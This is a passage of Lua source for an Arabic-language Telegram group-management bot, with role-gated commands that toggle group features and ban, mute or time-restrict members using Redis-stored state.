local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:BanId"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الحظر , الطرد , التقييد","md",true)
end
if TextMsg == 'الرفع' then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:SetId"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الرفع ","md",true)
end
if TextMsg == 'الالعاب' then
Redis:set(LaRiCa.."Status:Games"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل الالعاب ","md",true)
end
if TextMsg == 'التحقق' then
Redis:set(LaRiCa.."Status:joinet"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل التحقق ","md",true)
end
if TextMsg == 'نزلني' then
Redis:set(LaRiCa.."Status:remMe"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل نزلني ","md",true)
end
if TextMsg == 'البوت الخدمي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."BotFree",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل البوت الخدمي ","md",true)
end
if TextMsg == 'التواصل' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."TwaslBot",true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تفعيل التواصل داخل البوت ","md",true)
end

end

if text and text:match("^تعطيل (.*)$") and msg.reply_to_message_id == 0 then
local TextMsg = text:match("^تعطيل (.*)$")
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if TextMsg == 'الرابط' then
Redis:del(LaRiCa.."Status:Link"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الرابط ","md",true)
end
if TextMsg == 'الترحيب' then
Redis:del(LaRiCa.."Status:Welcome"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الترحيب ","md",true)
end
if TextMsg == 'الايدي' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:Id"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الايدي ","md",true)
end
if TextMsg == 'الايدي بالصوره' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:IdPhoto"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الايدي بالصوره ","md",true)
end
if TextMsg == 'الردود' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:Reply"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الردود ","md",true)
end
if TextMsg == 'الردود العامه' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:set(LaRiCa.."Status:ReplySudo"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الردود العامه ","md",true)
end
if TextMsg == 'الحظر' or TextMsg == 'الطرد' or TextMsg == 'التقييد' then
if not msg.Manger then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(6)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:BanId"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الحظر , الطرد , التقييد","md",true)
end
if TextMsg == 'الرفع' then
if not msg.Creator then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(5)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."Status:SetId"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الرفع ","md",true)
end
if TextMsg == 'الالعاب' then
Redis:del(LaRiCa.."Status:Games"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل الالعاب ","md",true)
end
if TextMsg == 'التحقق' then
    Redis:del(LaRiCa.."Status:joinet"..msg_chat_id) 
    return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل التحقق ","md",true)
    end
if TextMsg == 'نزلني' then
Redis:del(LaRiCa.."Status:remMe"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل نزلني ","md",true)
end
if TextMsg == 'البوت الخدمي' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."BotFree") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل البوت الخدمي ","md",true)
end
if TextMsg == 'التواصل' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(1)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
Redis:del(LaRiCa.."TwaslBot") 
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل التواصل داخل البوت ","md",true)
end

end

if text and text:match('^حظر عام @(%S+)$') then
local UserName = text:match('^حظر عام @(%S+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."BanAll:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanAll:Groups",UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم حظره عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء العام @(%S+)$') then
local UserName = text:match('^الغاء العام @(%S+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanAll:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanAll:Groups",UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء حظره عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^كتم عام @(%S+)$') then
local UserName = text:match('^كتم عام @(%S+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if Controller(msg_chat_id,UserId_Info.id) == 'المطور الاساسي' then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."ktmAll:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."ktmAll:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم كتمه عام من المجموعات ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم العام @(%S+)$') then
local UserName = text:match('^الغاء كتم العام @(%S+)$')
if not msg.Devss then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(2)..'* ',"md",true)  
end

local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."ktmAll:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء كتمه عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."ktmAll:Groups",UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء كتمه عام من المجموعات  ").Reply,"md",true)  
end
end
if text and text:match('^حظر @(%S+)$') then
local UserName = text:match('^حظر @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'banned',0)
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم حظره من الكروب ").Reply,"md",true)  
end
end
if text and text:match('^الغاء حظر @(%S+)$') then
local UserName = text:match('^الغاء حظر @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء حظره من الكروب مسبقا ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."BanGroup:Group"..msg_chat_id,UserId_Info.id) 
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,1,1,1,1,1,1,1,1})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء حظره من الكروب  ").Reply,"md",true)  
end
end

if text and text:match('^كتم @(%S+)$') then
local UserName = text:match('^كتم @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if GetInfoBot(msg).Delmsg == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حذف الرسائل* ',"md",true)  
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusSilent(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم كتمه في الكروب مسبقا ").Reply,"md",true)  
else
Redis:sadd(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم كتمه في الكروب  ").Reply,"md",true)  
end
end
if text and text:match('^الغاء كتم @(%S+)$') then
local UserName = text:match('^الغاء كتم @(%S+)$')
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
local UserId_Info = LuaTele.searchPublicChat(UserName)
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName and UserName:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if not Redis:sismember(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
else
Redis:srem(LaRiCa.."SilentGroup:Group"..msg_chat_id,UserId_Info.id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم الغاء كتمه من الكروب ").Reply,"md",true)  
end
end
if text and text:match('^تقييد (%d+) (.*) @(%S+)$') then
local UserName = {text:match('^تقييد (%d+) (.*) @(%S+)$') }
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local UserId_Info = LuaTele.searchPublicChat(UserName[3])
if not UserId_Info.id then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا يوجد حساب بهاذا المعرف ","md",true)  
end
if UserId_Info.type.is_channel == true then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف قناة او كروب ","md",true)  
end
if UserName[3] and UserName[3]:match('(%S+)[Bb][Oo][Tt]') then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام معرف البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." }*","md",true)  
end
if UserName[2] == 'يوم' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict* 86400
end
if UserName[2] == 'ساعه' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict* 3600
end
if UserName[2] == 'دقيقه' then
Time_Restrict = UserName[1]:match('(%d+)')
Time = Time_Restrict* 60
end
LuaTele.setChatMemberStatus(msg.chat_id,UserId_Info.id,'restricted',{1,0,0,0,0,0,0,0,0,tonumber(msg.date+Time)})
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id,"• تم تقييده في الكروب \n• لمدة : "..UserName[1]..' '..UserName[2]).Reply,"md",true)  
end

if text and text:match('^تقييد (%d+) (.*)$') and msg.reply_to_message_id ~= 0 then
local TimeKed = {text:match('^تقييد (%d+) (.*)$') }
if not msg.Admin then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• هذا الامر يخص  '..Controller_Num(7)..'* ',"md",true)  
end
if ChannelJoin(msg) == false then
local chinfo = Redis:get(LaRiCa.."ch:admin")
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = chinfo}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n• عليك الاشتراك في قناة البوت لاستخدام الاوامر*',"md",false, false, false, false, reply_markup)
end
if msg.can_be_deleted_for_all_users == false then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ البوت ليس ادمن في الكروب يرجى ترقيته وتفعيل الصلاحيات له*","md",true)  
end
if GetInfoBot(msg).BanUser == false then
return LuaTele.sendText(msg_chat_id,msg_id,'\n*• البوت ليس لديه صلاحيه حظر المستخدمين* ',"md",true)  
end
if not msg.Creator and not Redis:get(LaRiCa.."Status:BanId"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"• تم تعطيل (الحظر : الطرد : التقييد) من قبل المدراء","md",true)
end 
local Message_Reply = LuaTele.getMessage(msg.chat_id, msg.reply_to_message_id)
local UserInfo = LuaTele.getUser(Message_Reply.sender.user_id)
if UserInfo.message == "Invalid user ID" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ تستطيع فقط استخدام الامر على المستخدمين ","md",true)  
end
if UserInfo and UserInfo.type and UserInfo.type.luatele == "userTypeBot" then
return LuaTele.sendText(msg_chat_id,msg_id,"\n• عذرآ لا تستطيع استخدام الامر على البوت ","md",true)  
end
if StatusCanOrNotCan(msg_chat_id,Message_Reply.sender.user_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"\n*• عذرآ لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,Message_Reply.sender.user_id).." }*","md",true)  
end
if TimeKed[2] == 'يوم' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict* 86400
end
if TimeKed[2] == 'ساعه' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict* 3600
end
if TimeKed[2] == 'دقيقه' then
Time_Restrict = TimeKed[1]:match('(%d+)')
Time = Time_Restrict* 60
end
